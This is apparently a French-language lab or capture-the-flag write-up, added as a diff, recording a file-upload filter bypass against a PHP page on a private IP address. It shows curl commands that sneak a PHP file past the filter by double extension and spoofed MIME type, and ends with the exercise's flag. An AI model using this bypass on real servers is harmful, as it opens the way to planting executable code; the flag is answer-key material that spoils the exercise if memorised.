@@ -1,0 +1,17 @@
+Pour l'url '/index.php?page=upload#'
+
+Pour uploader une VRAIE image:
+	curl -F "uploaded=@/Users/ealbecke/Desktop/1.jpg" -F "Upload=Upload" "http://10.12.1.115/index.php?page=upload#"
+	=> Succes upload
+
+-- test.php --
+	curl -F "uploaded=@/Users/ealbecke/Desktop/test.php" -F "Upload=Upload" "http://10.12.1.115/index.php?page=upload#"
+	=> Not upload
+
+C'est un fichier php avec une juste une extension jpg, l fichier passe bien -- test.php.jpg --
+	curl -F "uploaded=@/Users/ealbecke/Desktop/test.php.jpg" -F "Upload=Upload" "http://10.12.1.115/index.php?page=upload#"
+	=> Success upload
+
+Fichier .php avec 'type=image/jpg'
+	curl -F "uploaded=@/Users/ealbecke/Desktop/test.php;type=image/jpg" -F "Upload=Upload" "http://10.12.1.115/index.php?page=upload#"
+	=>Succes + Flag: 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
